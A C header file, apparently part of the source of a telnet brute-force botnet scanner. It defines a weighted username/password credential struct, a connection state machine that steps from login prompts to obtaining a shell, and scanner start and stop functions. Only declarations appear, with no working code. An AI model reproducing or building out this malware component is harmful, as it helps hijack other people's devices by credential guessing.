#ifndef SCANNER_H
#define SCANNER_H

#include <stdint.h>

#define SCANNER_MAX_CONNS   128
#define SCANNER_RAW_PPS     160

#define SCANNER_RDBUF_SIZE  256
#define SCANNER_HACK_DRAIN  64

struct scanner_auth
{
    char *username;
    char *password;
    uint16_t weight_min, weight_max;
    uint8_t username_len, password_len;
} scanner_auth_t;

struct scanner_connection
{
    struct scanner_auth *auth;
    int fd, last_recv;
    enum
	{
        SC_CLOSED,
        SC_CONNECTING,
        SC_HANDLE_IACS,
        SC_WAITING_USERNAME,
        SC_WAITING_PASSWORD,
        SC_WAITING_PASSWD_RESP,
        SC_WAITING_ENABLE_RESP,
        SC_WAITING_SYSTEM_RESP,
        SC_WAITING_SHELL_RESP,
        SC_WAITING_SH_RESP,
        SC_WAITING_TOKEN_RESP
    } state;
    ipv4_t dst_addr;
    uint16_t dst_port;
    int rdbuf_pos;
    char rdbuf[SCANNER_RDBUF_SIZE];
    uint8_t tries;
} scanner_connection_t;

void scanner_init(void);
void scanner_kill(void);

#endif /* scanner_h */
